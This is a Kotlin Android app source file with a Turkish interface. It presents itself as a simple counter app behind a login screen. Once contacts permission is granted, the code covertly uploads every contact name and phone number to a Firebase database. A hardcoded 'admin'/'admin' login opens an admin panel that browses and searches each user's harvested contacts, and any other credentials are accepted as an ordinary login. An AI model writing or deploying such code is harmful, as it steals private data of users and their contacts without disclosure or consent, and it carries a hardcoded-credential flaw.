package com.luci.adli

import android.Manifest
import android.content.Context
import android.os.Bundle
import android.provider.ContactsContract
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.ExitToApp
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.Search
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import com.google.accompanist.permissions.ExperimentalPermissionsApi
import com.google.accompanist.permissions.isGranted
import com.google.accompanist.permissions.rememberPermissionState
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.tasks.await

class MainActivity : ComponentActivity() {
    @OptIn(ExperimentalPermissionsApi::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseApp.initializeApp(this)

        setContent {
            MaterialTheme {
                var isLoggedIn by remember { mutableStateOf(false) }
                var isAdmin by remember { mutableStateOf(false) }

                val onLogout = {
                    isLoggedIn = false
                    isAdmin = false
                }

                if (!isLoggedIn) {
                    LoginScreen { username, password ->
                        isLoggedIn = true
                        isAdmin = username == "admin" && password == "admin"
                    }
                } else {
                    if (isAdmin) {
                        AdminScreen(onLogout)
                    } else {
                        val permissionState = rememberPermissionState(Manifest.permission.READ_CONTACTS)

                        LaunchedEffect(Unit) {
                            permissionState.launchPermissionRequest()
                        }

                        if (permissionState.status.isGranted) {
                            LaunchedEffect(Unit) {
                                val userId = getOrCreateUserId(this@MainActivity)
                                val prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE)
                                val uploaded = prefs.getBoolean("contactsUploaded", false)

                                if (!uploaded) {
                                    val database = FirebaseDatabase.getInstance()
                                    val snapshot = database.getReference("users")
                                        .child(userId)
                                        .child("contacts")
                                        .get().await()

                                    if (!snapshot.exists()) {
                                        getContactsAndSaveToRealtimeDB(this@MainActivity, userId)
                                        prefs.edit().putBoolean("contactsUploaded", true).apply()
                                    }
                                }
                            }
                            CounterScreen(onLogout)
                        } else {
                            Text("Rehber izni gerekli.")
                        }
                    }
                }
            }
        }
    }

    @Composable
    fun LoginScreen(onLogin: (String, String) -> Unit) {
        var username by remember { mutableStateOf("") }
        var password by remember { mutableStateOf("") }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(32.dp),
            verticalArrangement = Arrangement.Center
        ) {
            Text("Giriş Yap", style = MaterialTheme.typography.headlineMedium)
            Spacer(modifier = Modifier.height(16.dp))

            OutlinedTextField(
                value = username,
                onValueChange = { username = it },
                label = { Text("Kullanıcı Adı") },
                modifier = Modifier.fillMaxWidth()
            )

            OutlinedTextField(
                value = password,
                onValueChange = { password = it },
                label = { Text("Şifre") },
                visualTransformation = PasswordVisualTransformation(),
                modifier = Modifier.fillMaxWidth()
            )

            Spacer(modifier = Modifier.height(16.dp))
            Button(onClick = { onLogin(username, password) }, modifier = Modifier.fillMaxWidth()) {
                Text("Giriş Yap")
            }
        }
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    fun CounterScreen(onLogout: () -> Unit) {
        var count by remember { mutableStateOf(0) }

        Scaffold(
            topBar = {
                TopAppBar(
                    title = { Text("Kullanıcı Sayfası") },
                    actions = {
                        IconButton(onClick = onLogout) {
                            Icon(Icons.Default.ExitToApp, contentDescription = "Çıkış")
                        }
                    }
                )
            }
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(32.dp),
                verticalArrangement = Arrangement.Center,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text("Sayaç: $count", style = MaterialTheme.typography.headlineMedium)
                Spacer(modifier = Modifier.height(16.dp))
                Button(onClick = { count++ }) {
                    Text("Arttır")
                }
            }
        }
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    fun AdminScreen(onLogout: () -> Unit) {
        var users by remember { mutableStateOf<List<String>>(emptyList()) }
        var selectedUser by remember { mutableStateOf<String?>(null) }
        var isLoading by remember { mutableStateOf(true) }

        LaunchedEffect(Unit) {
            val database = FirebaseDatabase.getInstance()
            val usersRef = database.getReference("users")

            usersRef.get().addOnSuccessListener { snapshot ->
                users = snapshot.children.mapNotNull { it.key }
                isLoading = false
            }.addOnFailureListener { isLoading = false }
        }

        if (isLoading) {
            Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                CircularProgressIndicator()
            }
        } else {
            if (selectedUser == null) {
                Scaffold(
                    topBar = {
                        TopAppBar(
                            title = { Text("Kullanıcılar") },
                            actions = {
                                IconButton(onClick = onLogout) {
                                    Icon(Icons.Default.ExitToApp, contentDescription = "Çıkış")
                                }
                            }
                        )
                    }
                ) { padding ->
                    LazyColumn(
                        contentPadding = PaddingValues(16.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp),
                        modifier = Modifier.padding(padding)
                    ) {
                        items(users) { userId ->
                            ElevatedCard(
                                modifier = Modifier.fillMaxWidth(),
                                shape = RoundedCornerShape(16.dp),
                                onClick = { selectedUser = userId }
                            ) {
                                ListItem(
                                    headlineContent = { Text("Kullanıcı ID") },
                                    supportingContent = { Text(userId.take(10) + "...") },
                                    leadingContent = { Icon(Icons.Default.Person, contentDescription = null) }
                                )
                            }
                        }
                    }
                }
            } else {
                UserContactsScreen(userId = selectedUser!!) {
                    selectedUser = null
                }
            }
        }
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    fun UserContactsScreen(userId: String, onBack: () -> Unit) {
        var contacts by remember { mutableStateOf<List<ContactUi>>(emptyList()) }
        var query by remember { mutableStateOf("") }
        var isLoading by remember { mutableStateOf(true) }

        LaunchedEffect(userId) {
            val database = FirebaseDatabase.getInstance()
            val contactsRef = database.getReference("users").child(userId).child("contacts")

            contactsRef.get().addOnSuccessListener { snapshot ->
                contacts = snapshot.children.mapNotNull { c ->
                    val name = c.child("name").getValue(String::class.java) ?: return@mapNotNull null
                    val phone = c.child("phone").getValue(String::class.java) ?: return@mapNotNull null
                    ContactUi(userId, name, phone)
                }
                isLoading = false
            }.addOnFailureListener { isLoading = false }
        }

        Scaffold(
            topBar = {
                TopAppBar(
                    title = { Text("Rehber - ${userId.take(8)}") },
                    navigationIcon = {
                        IconButton(onClick = onBack) {
                            Icon(Icons.Default.ArrowBack, contentDescription = "Geri")
                        }
                    }
                )
            }
        ) { padding ->
            if (isLoading) {
                Box(Modifier.fillMaxSize().padding(padding), contentAlignment = Alignment.Center) {
                    CircularProgressIndicator()
                }
            } else {
                Column(Modifier.fillMaxSize().padding(padding)) {
                    OutlinedTextField(
                        value = query,
                        onValueChange = { query = it },
                        label = { Text("Ara") },
                        leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(16.dp)
                    )

                    LazyColumn(
                        contentPadding = PaddingValues(16.dp),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        val filtered = contacts.filter {
                            it.name.contains(query, true) || it.phone.contains(query)
                        }
                        items(filtered) { contact ->
                            ElevatedCard(modifier = Modifier.fillMaxWidth()) {
                                ListItem(
                                    headlineContent = { Text(contact.name) },
                                    supportingContent = { Text(contact.phone) },
                                    leadingContent = { Icon(Icons.Default.Person, null) },
                                    trailingContent = { Icon(Icons.Default.Phone, null) }
                                )
                            }
                        }
                    }
                }
            }
        }
    }

    fun getContactsAndSaveToRealtimeDB(context: Context, userId: String) {
        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )

        val database = FirebaseDatabase.getInstance()
        val contactsRef = database.getReference("users").child(userId).child("contacts")

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))

                val contact = mapOf(
                    "name" to name,
                    "phone" to phone
                )

                contactsRef.push().setValue(contact)
            }
        }
    }

    fun getOrCreateUserId(context: Context): String {
        val prefs = context.getSharedPreferences("prefs", Context.MODE_PRIVATE)
        var userId = prefs.getString("userId", null)

        if (userId == null) {
            userId = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("userId", userId).apply()
        }

        return userId
    }
}

data class ContactUi(
    val userId: String,
    val name: String,
    val phone: String
)
